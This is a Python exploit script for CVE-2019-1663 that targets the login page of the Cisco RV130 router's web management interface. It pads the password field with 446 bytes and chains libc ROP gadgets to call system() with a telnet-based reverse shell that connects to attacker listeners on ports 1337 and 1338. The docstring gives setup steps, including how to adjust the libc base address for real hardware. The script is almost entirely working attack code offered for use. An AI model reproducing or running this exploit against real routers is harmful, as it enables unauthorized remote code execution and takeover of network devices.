#!/usr/bin/env python3

__description__ = 'CVE-2019-1663'
__author__ = 'Léandre Guiset'
__version__ = '0.1.0'
__date__ = '2024/12/29'

"""
Source code put in the public domain by Léandre Guiset, no Copyrights
https://github.com/ExyPnoze
Use at your own risk.

History:
    version 0.1.0
    2024/12/01: start.
Todo:
    Add verification.
    find a better reverse shell. :)

Description:
    CVE-2019-1663.py is a Python script targeting the web-based management interface of the CISCO RV130 Router.
    Due to improper validation of user-supplied data in the web interface, the script enables attackers to execute arbitrary code.
    This work is inspired by the research of Quentin Kaiser and Pen Test Partners.

    To use this script, you need to start two listeners on ports 1337 and 1338 and also update the IP address in the telnet command.
    Additionally, if you are using it on real hardware and not an emulated RV130, you will need to adjust the libc base address and the url.
    
    LIBC_BASE_IRL = 0x357FC000
    url = vpn.contoso.com
"""

import requests
import struct

base_libc = 0x402bb000
offset_sys = 0x0004d144
exp = 446*b"A"

#Playload init
gadget2 = 0x00037884 # mov ro, sp; blx r3;
gadget3 = 0x0002a135 # pop {r3, r7, pc};

exp += struct.pack("<L", base_libc + gadget3)
exp += struct.pack("<L", base_libc + offset_sys)
exp += b"FUCK" # JUNK
exp += struct.pack("<L", base_libc + gadget2)
exp += b"telnet IP 1337 | /bin/sh | telnet IP 1338" # cmd


#Request URL 
url = "http://localhost/login.cgi"

#Request struct
data = {
    "submit_button": "login",
    "submit_type": "",
    "gui_action": "",
    "default_login": "1",
    "wait_time": "0",
    "change_action": "",
    "enc": "1",
    "user": "cisco",
    "pwd": exp,
    "sel_lang": "EN"
}

# Post Request
x = requests.post(url, data=data, verify=False)